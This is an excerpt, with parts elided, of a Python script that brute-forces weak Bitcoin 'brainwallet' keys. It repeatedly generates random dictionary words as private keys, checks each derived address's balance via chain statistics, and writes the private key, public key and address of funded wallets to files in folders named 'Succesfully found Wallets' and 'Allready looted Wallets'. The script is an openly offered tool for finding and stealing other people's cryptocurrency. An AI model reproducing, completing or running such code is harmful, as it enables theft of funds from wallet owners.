...
while True:
    r = RandomWord()
    random_word = r.word(word_min_length=3, word_max_length=8) # Change word length here
    random_key = random_word
    print(random_key)
    time.sleep(1)
    ...
    if data['chain_stats']['funded_txo_sum'] > data['chain_stats']['spent_txo_sum']:
        ...
        while True:
            try:
                fp = open('Succesfully found Wallets/words/' + str(funded) + ' Bitcoin (' + str(i) + ').txt', 'x')
    ...
    if data['chain_stats']['funded_txo_sum'] > 0:
        ...
        while True:
            try:
                fp = open('Allready looted Wallets/words/' + str(funded) + ' Bitcoin (' + str(i) + ').txt', 'x')
                fp.write('Bitcoin Wallet Backup \n \n \n')
                fp.write('Your private key is: \n' + private_key + '\n \n')
                fp.write('Your public key is: \n' + pub_key + '\n \n')
                fp.write('Your adress is: \n' + address + '\n \n')
